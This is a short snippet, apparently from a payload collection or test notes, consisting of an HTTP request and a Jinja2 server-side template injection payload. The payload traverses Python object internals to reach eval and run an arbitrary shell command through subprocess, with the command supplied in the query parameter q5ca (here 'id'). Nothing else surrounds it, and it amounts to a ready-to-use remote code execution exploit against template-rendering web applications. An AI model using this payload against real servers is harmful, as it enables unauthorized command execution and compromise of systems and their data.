```
GET /?q5ca=id
```
```
{% for c in [1].__class__.__mro__[1].__subclasses__() %} 
    {% if c.__name__ == 'catch_warnings' %}
        {% for b in c.__init__.__globals__.values() %} 
            {% if b.__class__ == {'a':'b'}.__class__ %}
                {% if 'eval' in b.keys() %}
                    {{ b['eval']("__import__('subprocess').check_output('"%2brequest.args['q5ca']%2b"; return 0;', shell=True, stderr=-2)") }}
                {% endif %} 
            {% endif %} 
        {% endfor %}
    {% endif %}
{% endfor %}
```